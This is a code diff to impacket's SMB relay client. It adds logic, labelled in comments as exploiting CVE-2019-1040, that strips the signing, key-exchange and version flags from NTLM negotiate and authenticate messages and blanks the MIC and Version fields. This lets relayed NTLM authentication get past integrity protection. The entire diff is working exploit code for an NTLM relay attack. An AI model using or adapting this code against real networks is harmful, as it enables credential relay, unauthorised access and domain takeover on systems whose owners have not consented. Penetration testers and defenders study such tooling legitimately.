@@ -37,6 +37,7 @@ from impacket.smb3 import SMB3, SMB2_GLOBAL_CAP_ENCRYPTION, SMB2_DIALECT_WILDCAR
     SMB3Packet, SMB2_GLOBAL_CAP_LARGE_MTU, SMB2_GLOBAL_CAP_DIRECTORY_LEASING, SMB2_GLOBAL_CAP_MULTI_CHANNEL, \
     SMB2_GLOBAL_CAP_PERSISTENT_HANDLES, SMB2_NEGOTIATE_SIGNING_REQUIRED, SMB2Packet,SMB2SessionSetup, SMB2_SESSION_SETUP, STATUS_MORE_PROCESSING_REQUIRED, SMB2SessionSetup_Response
 from impacket.smbconnection import SMBConnection, SMB_DIALECT
+from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION
 from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
 from impacket.dcerpc.v5.transport import SMBTransport
 from impacket.dcerpc.v5 import scmr
@@ -304,10 +305,20 @@ class SMBRelayClient(ProtocolClient):
         self._uid = uid
 
     def sendNegotiate(self, negotiateMessage):
-        negotiate = NTLMAuthNegotiate()
-        negotiate.fromString(negotiateMessage)
-        #Remove the signing flag
-        negotiate['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+        negoMessage = NTLMAuthNegotiate()
+        negoMessage.fromString(negotiateMessage)
+        # When exploiting CVE-2019-1040, remove flags
+        if self.serverConfig.remove_mic:
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
+
+        negotiateMessage = negoMessage.getData()
 
         challenge = NTLMAuthChallenge()
         if self.session.getDialect() == SMB_DIALECT:
@@ -464,6 +475,25 @@ class SMBRelayClient(ProtocolClient):
         return clientResponse, errorCode
 
     def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
+
+        authMessage = NTLMAuthChallengeResponse()
+        authMessage.fromString(authenticateMessageBlob)
+        # When exploiting CVE-2019-1040, remove flags
+        if self.serverConfig.remove_mic:
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
+            authMessage['MIC'] = b''
+            authMessage['MICLen'] = 0
+            authMessage['Version'] = b''
+            authMessage['VersionLen'] = 0
+            authenticateMessageBlob = authMessage.getData()
+
         if unpack('B', authenticateMessageBlob[:1])[0] != SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
             # We need to wrap the NTLMSSP into SPNEGO
             respToken2 = SPNEGO_NegTokenResp()
